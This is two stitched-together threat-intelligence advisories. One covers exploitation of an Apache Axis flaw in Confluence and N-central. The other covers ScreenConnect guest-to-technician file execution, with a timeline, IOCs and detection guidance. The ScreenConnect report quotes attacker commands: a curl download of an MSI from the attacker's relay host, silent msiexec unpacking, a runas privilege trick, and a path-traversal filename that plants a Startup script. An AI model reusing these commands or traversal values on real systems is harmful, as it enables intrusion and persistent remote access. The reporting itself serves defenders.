Title: Rapid7 Detected Exploitation of CVE-2026-90436 against Atlassian Confluence Data Center, N-able N-central also Exploited
Context: Overview On November 6, 2026, the Apache Software Foundation disclosed CVE-2026-90436, a critical unsafe reflection vulnerability (CWE-470) in Axis 1
Full Text:
Overview

On November 6, 2026, the Apache Software Foundation disclosed CVE-2026-90436, a critical unsafe reflection vulnerability (CWE-470) in Axis 1.x that allows for unauthenticated remote code execution (RCE). Apache Axis is a Simple Object Access Protocol (SOAP) implementation used for the creation of Java Web services. CISA has assigned CVE-2026-90436 a CVSS score of 9.8 Critical.

Since the initial November 6 disclosure, it has transpired that some versions of Atlassian Confluence Data Center and N-able N-central use the affected Axis library and are vulnerable to CVE-2026-90436. Both products require a non-default configuration in order to be vulnerable.

CVE-2026-90436 is now being actively exploited in the wild against both known affected products. On November 13, 2026, Rapid7 MDR detected exploitation of CVE-2026-90436 against Atlassian Confluence Data Center in a customer environment. Separately, on November 13, 2026, N-able reported exploitation in the wild against N-central for a vulnerability that strongly correlates to CVE-2026-90436. A proof-of-concept exploit that leverages CVE-2026-90436 and targets N-central was published on November 12, 2026, as part of a series of public zero-day disclosures against N-central.

Rapid7 recommends remediating exposed systems on an emergency basis outside of normal patching cycles.

Mitigation guidance

Prioritize internet-accessible instances with the relevant APIs enabled, and check internal deployments as well. Apply the product-specific actions below, then investigate systems that were exposed for evidence of compromise.

Axis 1.x through 1.4 is affected but has reached end of life (EOL) and Apache does not plan to publish a fixed Axis 1.x release. Apache recommends moving to another SOAP engine (for example, Apache Axis 2) or using an Axis 1.x build with this patch applied. Organizations using products that are affected by this issue should follow the product vendor's specific remediation instructions.

Atlassian Confluence Data Center

Atlassian lists versions 1.x through to 9.x as affected when “Remote API (XML-RPC & SOAP)” is enabled. Version 9.2.28 is the fixed release. The setting has been off by default for new installations since version 3.0. Confluence version 10.x and later removed the feature so are not vulnerable, and Atlassian Cloud is unaffected.

Affected users should upgrade to version 9.2.28 or a current unaffected 10.x release. If patching must wait, an administrator can open “General Configuration” and “Further Configuration”, edit the settings, clear “Remote API (XML-RPC & SOAP)”, and save. The change takes effect without restarting Confluence, but integrations using the API may stop working.

Follow the Confluence advisory for the latest fixes and mitigation instructions.

N-able N-central

On-premises administrators should confirm that “Legacy API” is disabled, even on 2026.4 HF2. N-able states that it is off by default, and provides instructions for disabling Legacy API. Its November 13 guidance says hosted environments received temporary protections directly; customers in both hosting models must still follow the vendor's Agent and Probe upgrade guidance. N-able also temporarily disabled the Intune integration as a precaution. Refer to the N-able security update for these responsibilities.

N-able says 2026.4 HF3 will permanently remove Legacy API access. Its November 16 rollout notice states that hosted upgrades have been completed, and on-premises general availability is being finalized. On-premises administrators should confirm availability and follow the release instructions as the update becomes available.

IOCs

The presence of these IOCs in logs should prompt investigation, but the absence of these addresses does not confirm that an environment was unaffected.

Atlassian Confluence Data Center

The following IP addresses are associated with observed exploitation of CVE-2026-90436 against Atlassian Confluence Data Center:

5.133.47[.]243

163.182.68[.]109

104.13.106[.]166

N-able N-central

N-able's November 13 incident update lists these IP addresses as IOCs for N-central customers who had not disabled Legacy API.

157.20.241[.]16

139.99.69[.]109

The vendor's update also lists associated URLs for use in compromise assessment.

Updates

Title: CVE-2026-84869 in ScreenConnect Exploited to Run Malicious Files on MSP Technician Accounts
Context: The malware, called SCKit, appears to be leveraging a vulnerable third-party extension on the server side of ScreenConnect and not directly exploiting CVE-2026-84869, but...
Full Text:
What Is CVE-2026-84869?

ConnectWise disclosed CVE-2026-84869 on September 8, 2026, with a CVSS score of 9.9, and CISA added the CVE to its Known Exploited Vulnerabilities catalog on September 11. ConnectWise's advisory stated that in both Support and Access sessions, a guest could trigger file-transfer actions that the technician's host client processed without authorization or confirmation, including running the file with elevated rights. ConnectWise listed 26.6.5 as the fixed version for host clients and Access agents, and recommended removing the TransferFiles permission as an interim mitigation.

Figure 1: CVE-2026-84869 file transfer spray campaign by the numbers

In the days leading up to CVE-2026-84869's disclosure, Huntress stood up a Rapid Response to worm-like activity that spawned rogue ScreenConnect clients and dropped malicious VBScript files across several customer environments. On November 11, we stood up another Rapid Response to more worm-like activity where an attacker used Run commands on cloud-hosted panels to install rogue ScreenConnect clients and session-cookie relays on hundreds of managed endpoints. The malware, called SCKit, appears to be leveraging a vulnerable third-party extension on the server side of ScreenConnect and not directly exploiting CVE-2026-84869, but attempting to stage it as a "relay trap" for subsequent technician connections.

This most recent activity is distinct from a separate campaign we reported on November 13 that planted unauthorized guest sessions disguised with crypto exchange names on more than 100 MSP ScreenConnect servers. While we did not observe the attacker using the unauthorized sessions in this manner, the crypto exchange names may be intended to lure a technician into opening the session and running a malicious file on their client.

An MSP technician's workstation typically holds RMM consoles, saved credentials, and access to every customer, making it an exceptionally attractive target. When a technician joins a remote session, their ScreenConnect host client and the guest machine can exchange files. Normally, the technician decides what moves and what runs.

A malicious guest exploiting CVE-2026-84869 can push a file to the technician's machine and get the technician's own client to run it. From the technician's view, no prompt appears. They only have to join the session, whether from an attacker-controlled machine or a real customer's support session that the attacker has slipped into as an extra guest.

Huntress Observations

A full compromise in 9 seconds

On November 12, we observed a technician at one MSP using their ScreenConnect host client to join a blank-named Access session on the MSP's server. Here's what the process telemetry from the technician's workstation shows, in UTC:

Time

What happened

16:46:20.7

The host client runs a guest-pushed update_224ac089.bat from the client's Documents\...\Temp\ folder, with the argument xhsdf_wrwerhjf_shhdga

16:46:21.7

The script relaunches itself hidden through PowerShell and WScript.Shell

16:46:22.2

It decodes a Base64 Telegram bot token and chat ID and reports the new victim to the operator

16:46:22.6

Recon: reg query for the Windows product name and build, a check for an existing copy of its own client, and net session to test for admin rights

16:46:23.9

curl downloads hxxps://masterdarky[.]com/WindowsUpdate.msi to %TEMP%\wupdate_224ac089.msi

16:46:25.8

msiexec /a ... TARGETDIR=%LOCALAPPDATA%\wclient_224ac089 /qn unpacks the MSI as an administrative image, which leaves no install record

16:46:26.2

sc config seclogon start= auto and net start seclogon

16:46:28.3

runas /trustlevel:0x20000 and a PowerShell Start-Process launch the payload; csc.exe compiles a PowerShell Add-Type

16:46:29.1

WindowsUpdate.WindowsClient.exe "h=masterdarky[.]com&p=8041&k=..." starts: a rebranded ScreenConnect client connected to the attacker's relay

Figure 2: The CVE-2026-84869 exploitation chain on a technician workstation on November 12, 2026

The attacker now has their own remote-access client on the technician's machine that looks like legitimate ScreenConnect and named after Windows Update.

The observed curl commands suggest that the attacker may have expected unreliable networks in their spraying attempts:

-A "Mozilla/5.0" --ssl-no-revoke --tlsv1.2 -f -L -C - --connect-timeout 20 --max-time 900 --retry 2 --speed-limit 2048 --speed-time 60

The spray: hundreds of thousands of requests, waiting for someone to join

How did that batch file reach the technician? On other MSPs' servers, we can see the delivery side in the server's own database.

Across 42 MSP ScreenConnect servers between October 20 and November 16, attacker guests made 688,000 "run file" requests for files named update.bat or update_<8 hex>.bat from 29 source IP addresses. On the busiest server, 10 guest sessions from seven IPs made 70,414 requests over three weeks. The guests made repeated requests in case a technician happened to join.

Figure 3: Guest "run file" requests for update.bat-style batch files per ScreenConnect server, anonymized

The <8 hex> part of the file name looks like a payload or wave ID, not a per-victim ID. That's what ties the spray to the full compromise above: the exact file update_224ac089.bat was sprayed at five MSP ScreenConnect servers, starting within 2 seconds of each other at 16:03 UTC on November 12, 43 minutes before the compromise. Each server received it between 585 and 5,671 times, and three were still receiving it on November 16. The day before, the same sessions sprayed an earlier wave, update_c99a4b29.bat. We assess with high confidence that the spray operator and the masterdarky[.]com operator are the same.

What the spray guests look like:

blank session names or default-looking Windows hostnames

a claimed guest client version matching the server's own build (25.8.3.9466 on the busiest server)

no preview image, or a JPEG

an empty guest public key on about half of the sessions on the busiest server

All five sessions that sprayed update_224ac089.bat , and 27 spray sessions across 17 servers in total, have the session's Company property (CustomProperty1) set to crypto client. This is distinct from our previous reporting on crypto-exchange named decoys, which had this property left blank.

Canary song: A test run on a second technician

On November 13 at 01:49 UTC, a technician at another MSP joined a session presenting as a laptop. The guest, at 91.224.92[.]167, had been reconnecting to the MSP's server since late October, even after a technician queued it for uninstall. Two seconds after the technician joined, the guest pushed marker.txt. About three seconds after that, the technician's client ran it, and it opened in Notepad++. Nothing else followed until the host went offline 18 minutes later.

A harmless text file that announces itself is a classic canary; it proves the exploit works against this target before anything real is sent. The same IP pushed marker.txt three times at a technician at a third MSP in late October, each time while that technician was connected. We don't know whether that client ran it. Unlike the spray, this guest looked like a real, named Windows machine with a non-empty key and screenshot, which would fit a person driving it by hand.

This technician had also joined one of the unauthorized crypto-named guest sessions we were investigating about a minute earlier. While nothing came from that session, we mention it because it shows how close the two campaigns come in practice, targeting the same technician on the same vulnerable client inside a minute.

Path traversal into a technician's Startup folder

The most targeted activity we found happened in October, on one MSP's server. In three real support sessions technicians created for customers over multiple days, an attacker joined as an additional guest and asked the technician's client to run the following file:

../../../AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/Sync.bat

If the client honored that path, it would drop a script into the technician's own Startup folder, where it would run at their next logon. Each push was sent while a different technician was connected (October 23, 24 and 27), from 193.26.115[.]63 and 57.128.131[.]66. Two of the technicians were on vulnerable Windows clients while the third used the Mac client, where a Windows Startup path failed.

A near-miss

On October 19, a guest at 91.224.92[.]83 (the same /24 as the canary IP) pushed Run-Lateral.bat seven times at a technician on a vulnerable 24.2 client. The closest push arrived 4.3 seconds after the technician disconnected, so nothing was delivered. We count this as a near-miss, not an exposure.

On another server, a guest at 107.148.223[.]37 pushed svc_payload.cmd 207 times; the technician joined only after the last push.

Figure 4: Spray activity per server and technician-exposure events, October 19 to November 16, 2026

What should MSPs do?

1. Patch technician clients now

Update every technician's ScreenConnect host client to 26.6.5 or later, and any Access agents ConnectWise lists. Updating the server alone doesn't fix this, because the vulnerable code runs on the technician's machine. Your server's connection history records which client version each technician used. In the cases discussed in this post, many technicians were still on 22.x, 24.2 and 25.8 clients weeks after the fix shipped.

If you can't patch today, remove the TransferFiles permission from roles and session groups, as ConnectWise advises.

2. Hunt for exposure

On the server (App_Data\Session.db, work on a copy), look for RanFiles (EventType 85) or SentFiles (86) events sent by a guest connection (ProcessType = 2), especially:

repeated requests for update.bat / update_<8hex>.bat in blank-named sessions

marker.txt, Run-Lateral.bat, svc_payload.cmd

any path containing ../

Then check whether a Host connection (ProcessType = 1) was open at that moment. That overlap is the exposure.

On technician workstations, look for:

ScreenConnect.WindowsClient.exe (or your branded client) running .bat, .cmd, .ps1, .vbs,.js, or .txt files from Documents\*\Temp\

anything in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ you didn't put there, especially Sync.bat

folders named %LOCALAPPDATA%\wclient_<8hex> and files named %TEMP%\wupdate_<8hex>.msi

WindowsUpdate.WindowsClient.exe or any ScreenConnect client whose command line points at a relay that isn't yours.

Kill spray sessions by deleting blank-named guest sessions that keep asking to run update*.bat. They come back, so check again.

3. If you find a hit

Isolate the technician's workstation, then:

Kill the rogue client and remove %LOCALAPPDATA%\wclient_<id> and the wupdate_<id>.msi.

Set seclogon back to its normal start type.

Rotate every credential that was reachable from that workstation: RMM, PSA, ScreenConnect, password vault, and customer admin accounts.

Assume the attacker could see everything the technician could.

4. Shrink the attack surface

Restrict who can join sessions as a guest, and review guest-side permissions on Support sessions.

Restrict access to your ScreenConnect web interface and installer downloads by IP or VPN where you can.

Don't join unattended sessions you can't tie to a customer.

Detection opportunities

Process: Parent ScreenConnect.WindowsClient.exe → child cmd.exe / powershell.exe / wscript.exe / notepad*.exe, where the command line references \ScreenConnect\Temp\ or \<brand>\Temp\ and the parent's arguments contain RunFile.

Process: msiexec.exe /a with TARGETDIR=%LOCALAPPDATA%\<prefix>_<8hex>, followed by runas /trustlevel:0x20000.

Process: curl downloading an .msi from a script that a ScreenConnect host client started.

Server: Guest-originated RanFiles with ../ traversal or a Startup path; high-volume RanFiles from one guest session.

Network: Outbound ScreenConnect relay connections (often port 8041) on domains you don't own.

Indicators of Compromise (IOCs)

Item

Description

masterdarky[.]com

Attacker ScreenConnect relay (port 8041) and payload host

hxxps://masterdarky[.]com/WindowsUpdate.msi

Stage-2 installer containing the rebranded ScreenConnect client
